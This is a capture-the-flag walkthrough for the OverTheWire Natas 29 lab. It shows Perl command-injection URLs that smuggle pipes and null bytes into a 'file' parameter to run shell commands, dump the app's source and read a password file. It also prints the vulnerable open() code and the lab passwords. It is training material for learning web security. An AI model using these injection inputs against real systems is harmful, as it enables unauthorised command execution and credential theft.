# Natas Level 28 → Level 29 Perl Command Injection

## Previous Flag
<b>31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns</b>

## Goal
Username: natas29<br>
URL: http://natas29.natas.labs.overthewire.org<br>

H3y K1dZ,<br>
y0 rEm3mB3rz p3Rl rit3?<br>
\/\/4Nn4 g0 olD5kewL? R3aD Up!

## What I learned
```
Main target: /etc/natas_webpass/natas30
Common Pearl Command Injection: https://glasgowned.github.io/PenTesting/Exploits_and_Code_Execution/command_injection/
    | or ;

Bypass filename: https://medium.com/@ameerpornillos/securinets-ctf-quals-2019-welcome-pwn-write-up-42b50b546d66
Command Injection Cheat: https://hackersonlineclub.com/command-injection-cheatsheet/?ref=learnhacking.io
```

## Solution
```
http://natas29.natas.labs.overthewire.org/index.pl?file=|ls| ⌨️            # Not work
http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%00| ⌨️         # Null Termination works look on bottom screen
    index.pl perl underground 2.txt perl underground 3.txt perl underground 4.txt perl underground 5.txt perl underground.txt
http://natas29.natas.labs.overthewire.org/index.pl?file=|pwd%00| ⌨️
    /var/www/natas/natas29

# cat index.pl (but found it got rendered, can convert to hex or base64 first)
http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20./index.pl%00 ⌨️

# cat index.pl w/o getting rendered as html (just needed the %00 at end autofills others) ❤️❤️❤️❤️❤️
http://natas29.natas.labs.overthewire.org/index.pl?file=|%20cat%20index.pl%20|%20base64%00 ⌨️

IyEvdXNyL2Jpbi9wZXJsCnVzZSBDR0kgcXcoOnN0YW5kYXJkKTsKCnByaW50IDw8RU5EOwpDb250 ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1pc28tODg1OS0xCgo8IURPQ1RZUEUgSFRNTCBQ VUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMS8vRU4iPgo8aGVhZD4KPCEtLSBUaGlzIHN0dWZm IGluIHRoZSBoZWFkZXIgaGFzIG5vdGhpbmcgdG8gZG8gd2l0aCB0aGUgbGV2ZWwgLS0+CjxsaW5r IHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Imh0dHA6Ly9uYXRhcy5sYWJz Lm92ZXJ0aGV3aXJlLm9yZy9jc3MvbGV2ZWwuY3NzIj4KPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBo cmVmPSJodHRwOi8vbmF0YXMubGFicy5vdmVydGhld2lyZS5vcmcvY3NzL2pxdWVyeS11aS5jc3Mi IC8+CjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cDovL25hdGFzLmxhYnMub3ZlcnRo ZXdpcmUub3JnL2Nzcy93ZWNoYWxsLmNzcyIgLz4KPHNjcmlwdCBzcmM9Imh0dHA6Ly9uYXRhcy5s YWJzLm92ZXJ0aGV3aXJlLm9yZy9qcy9qcXVlcnktMS45LjEuanMiPjwvc2NyaXB0Pgo8c2NyaXB0 IHNyYz0iaHR0cDovL25hdGFzLmxhYnMub3ZlcnRoZXdpcmUub3JnL2pzL2pxdWVyeS11aS5qcyI+ PC9zY3JpcHQ+CjxzY3JpcHQgc3JjPWh0dHA6Ly9uYXRhcy5sYWJzLm92ZXJ0aGV3aXJlLm9yZy9q cy93ZWNoYWxsLWRhdGEuanM+PC9zY3JpcHQ+PHNjcmlwdCBzcmM9Imh0dHA6Ly9uYXRhcy5sYWJz Lm92ZXJ0aGV3aXJlLm9yZy9qcy93ZWNoYWxsLmpzIj48L3NjcmlwdD4KPHNjcmlwdD52YXIgd2Vj aGFsbGluZm8gPSB7ICJsZXZlbCI6ICJuYXRhczI5IiwgInBhc3MiOiAiMzFGNGozUWkyUG51aEla UW9reFhrMUwzUVQ5Q3BwbnMiIH07PC9zY3JpcHQ+PC9oZWFkPgo8Ym9keSBvbmNvbnRleHRtZW51 PSJqYXZhc2NyaXB0OmFsZXJ0KCdyaWdodCBjbGlja2luZyBoYXMgYmVlbiBibG9ja2VkIScpO3Jl dHVybiBmYWxzZTsiPgoKPHN0eWxlPgoKI2NvbnRlbnQgewogICAgd2lkdGg6IDEwMDBweDsKfQpw cmV7CiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwOyAKICAgIGNvbG9yOiAjMDBGRjAwOyAK fSAKCjwvc3R5bGU+Cgo8aDE+bmF0YXMyOTwvaDE+CjxkaXYgaWQ9ImNvbnRlbnQiPgpFTkQKIwoj IG1vcmxhIC8xMDExMQojICckXz1xdy9sanR0ZnQzZHZ1ey8scy8uL3ByaW50IGNociBvcmQoJCYp LTEvZWcnCiMKIyBjcmVkaXRzIGZvciB0aGUgcHJldmlvdXMgbGV2ZWwgZ28gdG8gd2hvZXZlciAK IyBjcmVhdGVkIGluc29tbmloYWNrMjAxNi9mcmlkZ2luYXRvciwgd2hlcmUgaSBzdG9sZSB0aGUg aWRlYSBmcm9tLiAKIyB0aGF0IHdhcyBhIGZ1biBjaGFsbGVuZ2UsIFRoYW5rcyEgCiMKCnByaW50 IDw8RU5EOwpIM3kgSzFkWiw8YnI+CnkwIHJFbTNtQjNyeiBwM1JsIHJpdDM/PGJyPgpcXC9cXC80 Tm40IGcwIG9sRDVrZXdMPyBSM2FEIFVwITxicj48YnI+Cgo8Zm9ybSBhY3Rpb249ImluZGV4LnBs IiBtZXRob2Q9IkdFVCI+CjxzZWxlY3QgbmFtZT0iZmlsZSIgb25jaGFuZ2U9InRoaXMuZm9ybS5z dWJtaXQoKSI+CiAgPG9wdGlvbiB2YWx1ZT0iIj5zM2xFY1Qgc3VNcDFuITwvb3B0aW9uPgogIDxv cHRpb24gdmFsdWU9InBlcmwgdW5kZXJncm91bmQiPnBlcmwgdW5kZXJncm91bmQ8L29wdGlvbj4K ICA8b3B0aW9uIHZhbHVlPSJwZXJsIHVuZGVyZ3JvdW5kIDIiPnBlcmwgdW5kZXJncm91bmQgMjwv b3B0aW9uPgogIDxvcHRpb24gdmFsdWU9InBlcmwgdW5kZXJncm91bmQgMyI+cGVybCB1bmRlcmdy b3VuZCAzPC9vcHRpb24+CiAgPG9wdGlvbiB2YWx1ZT0icGVybCB1bmRlcmdyb3VuZCA0Ij5wZXJs IHVuZGVyZ3JvdW5kIDQ8L29wdGlvbj4KICA8b3B0aW9uIHZhbHVlPSJwZXJsIHVuZGVyZ3JvdW5k IDUiPnBlcmwgdW5kZXJncm91bmQgNTwvb3B0aW9uPgo8L3NlbGVjdD4KPC9mb3JtPgoKRU5ECgpp ZihwYXJhbSgnZmlsZScpKXsKICAgICRmPXBhcmFtKCdmaWxlJyk7CiAgICBpZigkZj1+L25hdGFz Lyl7CiAgICAgICAgcHJpbnQgIm1lZWVlZWVwITxicj4iOwogICAgfQogICAgZWxzZXsKICAgICAg ICBvcGVuKEZELCAiJGYudHh0Iik7CiAgICAgICAgcHJpbnQgIjxwcmU+IjsKICAgICAgICB3aGls ZSAoPEZEPil7CiAgICAgICAgICAgIHByaW50IENHSTo6ZXNjYXBlSFRNTCgkXyk7CiAgICAgICAg fQogICAgICAgIHByaW50ICI8L3ByZT4iOwogICAgfQp9CgpwcmludCA8PEVORDsKPGRpdiBpZD0i dmlld3NvdXJjZSI+YzRuIFkwIGg0eiBzNHVjMz88L2Rpdj4KPC9kaXY+CjwvYm9keT4KPC9odG1s PgpFTkQK

CyberChef
    From Base64
https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=SXlFdmRYTnlMMkpwYmk5d1pYSnNDblZ6WlNCRFIwa2djWGNvT25OMFlXNWtZWEprS1RzS0NuQnlhVzUwSUR3OFJVNUVPd3BEYjI1MCBaVzUwTFZSNWNHVTZJSFJsZUhRdmFIUnRiRHNnWTJoaGNuTmxkRDFwYzI4dE9EZzFPUzB4Q2dvOElVUlBRMVJaVUVVZ1NGUk5UQ0JRIFZVSk1TVU1nSWkwdkwxY3pReTh2UkZSRUlFaFVUVXdnTkM0d01TOHZSVTRpUGdvOGFHVmhaRDRLUENFdExTQlVhR2x6SUhOMGRXWm0gSUdsdUlIUm9aU0JvWldGa1pYSWdhR0Z6SUc1dmRHaHBibWNnZEc4Z1pHOGdkMmwwYUNCMGFHVWdiR1YyWld3Z0xTMCtDanhzYVc1ciBJSEpsYkQwaWMzUjViR1Z6YUdWbGRDSWdkSGx3WlQwaWRHVjRkQzlqYzNNaUlHaHlaV1k5SW1oMGRIQTZMeTl1WVhSaGN5NXNZV0p6IExtOTJaWEowYUdWM2FYSmxMbTl5Wnk5amMzTXZiR1YyWld3dVkzTnpJajRLUEd4cGJtc2djbVZzUFNKemRIbHNaWE5vWldWMElpQm8gY21WbVBTSm9kSFJ3T2k4dmJtRjBZWE11YkdGaWN5NXZkbVZ5ZEdobGQybHlaUzV2Y21jdlkzTnpMMnB4ZFdWeWVTMTFhUzVqYzNNaSBJQzgrQ2p4c2FXNXJJSEpsYkQwaWMzUjViR1Z6YUdWbGRDSWdhSEpsWmowaWFIUjBjRG92TDI1aGRHRnpMbXhoWW5NdWIzWmxjblJvIFpYZHBjbVV1YjNKbkwyTnpjeTkzWldOb1lXeHNMbU56Y3lJZ0x6NEtQSE5qY21sd2RDQnpjbU05SW1oMGRIQTZMeTl1WVhSaGN5NXMgWVdKekxtOTJaWEowYUdWM2FYSmxMbTl5Wnk5cWN5OXFjWFZsY25rdE1TNDVMakV1YW5NaVBqd3ZjMk55YVhCMFBnbzhjMk55YVhCMCBJSE55WXowaWFIUjBjRG92TDI1aGRHRnpMbXhoWW5NdWIzWmxjblJvWlhkcGNtVXViM0puTDJwekwycHhkV1Z5ZVMxMWFTNXFjeUkrIFBDOXpZM0pwY0hRK0NqeHpZM0pwY0hRZ2MzSmpQV2gwZEhBNkx5OXVZWFJoY3k1c1lXSnpMbTkyWlhKMGFHVjNhWEpsTG05eVp5OXEgY3k5M1pXTm9ZV3hzTFdSaGRHRXVhbk0rUEM5elkzSnBjSFErUEhOamNtbHdkQ0J6Y21NOUltaDBkSEE2THk5dVlYUmhjeTVzWVdKeiBMbTkyWlhKMGFHVjNhWEpsTG05eVp5OXFjeTkzWldOb1lXeHNMbXB6SWo0OEwzTmpjbWx3ZEQ0S1BITmpjbWx3ZEQ1MllYSWdkMlZqIGFHRnNiR2x1Wm04Z1BTQjdJQ0pzWlhabGJDSTZJQ0p1WVhSaGN6STVJaXdnSW5CaGMzTWlPaUFpTXpGR05Hb3pVV2t5VUc1MWFFbGEgVVc5cmVGaHJNVXd6VVZRNVEzQndibk1pSUgwN1BDOXpZM0pwY0hRK1BDOW9aV0ZrUGdvOFltOWtlU0J2Ym1OdmJuUmxlSFJ0Wlc1MSBQU0pxWVhaaGMyTnlhWEIwT21Gc1pYSjBLQ2R5YVdkb2RDQmpiR2xqYTJsdVp5Qm9ZWE1nWW1WbGJpQmliRzlqYTJWa0lTY3BPM0psIGRIVnliaUJtWVd4elpUc2lQZ29LUEhOMGVXeGxQZ29LSTJOdmJuUmxiblFnZXdvZ0lDQWdkMmxrZEdnNklERXdNREJ3ZURzS2ZRcHcgY21WN0NpQWdJQ0JpWVdOclozSnZkVzVrTFdOdmJHOXlPaUFqTURBd01EQXdPeUFLSUNBZ0lHTnZiRzl5T2lBak1EQkdSakF3T3lBSyBmU0FLQ2p3dmMzUjViR1UrQ2dvOGFERStibUYwWVhNeU9Ud3ZhREUrQ2p4a2FYWWdhV1E5SW1OdmJuUmxiblFpUGdwRlRrUUtJd29qIElHMXZjbXhoSUM4eE1ERXhNUW9qSUNja1h6MXhkeTlzYW5SMFpuUXpaSFoxZXk4c2N5OHVMM0J5YVc1MElHTm9jaUJ2Y21Rb0pDWXAgTFRFdlpXY25DaU1LSXlCamNtVmthWFJ6SUdadmNpQjBhR1VnY0hKbGRtbHZkWE1nYkdWMlpXd2daMjhnZEc4Z2QyaHZaWFpsY2lBSyBJeUJqY21WaGRHVmtJR2x1YzI5dGJtbG9ZV05yTWpBeE5pOW1jbWxrWjJsdVlYUnZjaXdnZDJobGNtVWdhU0J6ZEc5c1pTQjBhR1VnIGFXUmxZU0JtY205dExpQUtJeUIwYUdGMElIZGhjeUJoSUdaMWJpQmphR0ZzYkdWdVoyVXNJRlJvWVc1cmN5RWdDaU1LQ25CeWFXNTAgSUR3OFJVNUVPd3BJTTNrZ1N6RmtXaXc4WW5JK0Nua3dJSEpGYlROdFFqTnllaUJ3TTFKc0lISnBkRE0vUEdKeVBncGNYQzljWEM4MCBUbTQwSUdjd0lHOXNSRFZyWlhkTVB5QlNNMkZFSUZWd0lUeGljajQ4WW5JK0NnbzhabTl5YlNCaFkzUnBiMjQ5SW1sdVpHVjRMbkJzIElpQnRaWFJvYjJROUlrZEZWQ0krQ2p4elpXeGxZM1FnYm1GdFpUMGlabWxzWlNJZ2IyNWphR0Z1WjJVOUluUm9hWE11Wm05eWJTNXogZFdKdGFYUW9LU0krQ2lBZ1BHOXdkR2x2YmlCMllXeDFaVDBpSWo1ek0yeEZZMVFnYzNWTmNERnVJVHd2YjNCMGFXOXVQZ29nSUR4diBjSFJwYjI0Z2RtRnNkV1U5SW5CbGNtd2dkVzVrWlhKbmNtOTFibVFpUG5CbGNtd2dkVzVrWlhKbmNtOTFibVE4TDI5d2RHbHZiajRLIElDQThiM0IwYVc5dUlIWmhiSFZsUFNKd1pYSnNJSFZ1WkdWeVozSnZkVzVrSURJaVBuQmxjbXdnZFc1a1pYSm5jbTkxYm1RZ01qd3YgYjNCMGFXOXVQZ29nSUR4dmNIUnBiMjRnZG1Gc2RXVTlJbkJsY213Z2RXNWtaWEpuY205MWJtUWdNeUkrY0dWeWJDQjFibVJsY21keSBiM1Z1WkNBelBDOXZjSFJwYjI0K0NpQWdQRzl3ZEdsdmJpQjJZV3gxWlQwaWNHVnliQ0IxYm1SbGNtZHliM1Z1WkNBMElqNXdaWEpzIElIVnVaR1Z5WjNKdmRXNWtJRFE4TDI5d2RHbHZiajRLSUNBOGIzQjBhVzl1SUhaaGJIVmxQU0p3WlhKc0lIVnVaR1Z5WjNKdmRXNWsgSURVaVBuQmxjbXdnZFc1a1pYSm5jbTkxYm1RZ05Ud3ZiM0IwYVc5dVBnbzhMM05sYkdWamRENEtQQzltYjNKdFBnb0tSVTVFQ2dwcCBaaWh3WVhKaGJTZ25abWxzWlNjcEtYc0tJQ0FnSUNSbVBYQmhjbUZ0S0NkbWFXeGxKeWs3Q2lBZ0lDQnBaaWdrWmoxK0wyNWhkR0Z6IEx5bDdDaUFnSUNBZ0lDQWdjSEpwYm5RZ0ltMWxaV1ZsWldWd0lUeGljajRpT3dvZ0lDQWdmUW9nSUNBZ1pXeHpaWHNLSUNBZ0lDQWcgSUNCdmNHVnVLRVpFTENBaUpHWXVkSGgwSWlrN0NpQWdJQ0FnSUNBZ2NISnBiblFnSWp4d2NtVStJanNLSUNBZ0lDQWdJQ0IzYUdscyBaU0FvUEVaRVBpbDdDaUFnSUNBZ0lDQWdJQ0FnSUhCeWFXNTBJRU5IU1RvNlpYTmpZWEJsU0ZSTlRDZ2tYeWs3Q2lBZ0lDQWdJQ0FnIGZRb2dJQ0FnSUNBZ0lIQnlhVzUwSUNJOEwzQnlaVDRpT3dvZ0lDQWdmUXA5Q2dwd2NtbHVkQ0E4UEVWT1JEc0tQR1JwZGlCcFpEMGkgZG1sbGQzTnZkWEpqWlNJK1l6UnVJRmt3SUdnMGVpQnpOSFZqTXo4OEwyUnBkajRLUEM5a2FYWStDand2WW05a2VUNEtQQzlvZEcxcyBQZ3BGVGtRSw ⌨️

#!/usr/bin/perl
use CGI qw(:standard);

print <<END;
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas29", "pass": "31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">

<style>
#content {
    width: 1000px;
}
pre{
    background-color: #000000; 
    color: #00FF00; 
} 

</style>

<h1>natas29</h1>
<div id="content">
END
#
# morla /10111
# '$_=qw/ljttft3dvu{/,s/./print chr ord($&)-1/eg'
#
# credits for the previous level go to whoever 
# created insomnihack2016/fridginator, where i stole the idea from. 
# that was a fun challenge, Thanks! 
#

print <<END;
H3y K1dZ,<br>
y0 rEm3mB3rz p3Rl rit3?<br>
\\/\\/4Nn4 g0 olD5kewL? R3aD Up!<br><br>

<form action="index.pl" method="GET">
<select name="file" onchange="this.form.submit()">
  <option value="">s3lEcT suMp1n!</option>
  <option value="perl underground">perl underground</option>
  <option value="perl underground 2">perl underground 2</option>
  <option value="perl underground 3">perl underground 3</option>
  <option value="perl underground 4">perl underground 4</option>
  <option value="perl underground 5">perl underground 5</option>
</select>
</form>

END

if(param('file')){ 👀
    $f=param('file');
    if($f=~/natas/){
        print "meeeeeep!<br>";
    }
    else{
        open(FD, "$f.txt");
        print "<pre>";
        while (<FD>){
            print CGI::escapeHTML($_);
        }
        print "</pre>";
    }
}

print <<END;
<div id="viewsource">c4n Y0 h4z s4uc3?</div>
</div>
</body>
</html>
END

http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/n?tas_webpass/n?tas30%00 ⌨️
WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH 🔐
```

## Flag
<b>WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH</b>

## Continue
[Continue](/overthewire/Natas2930.md)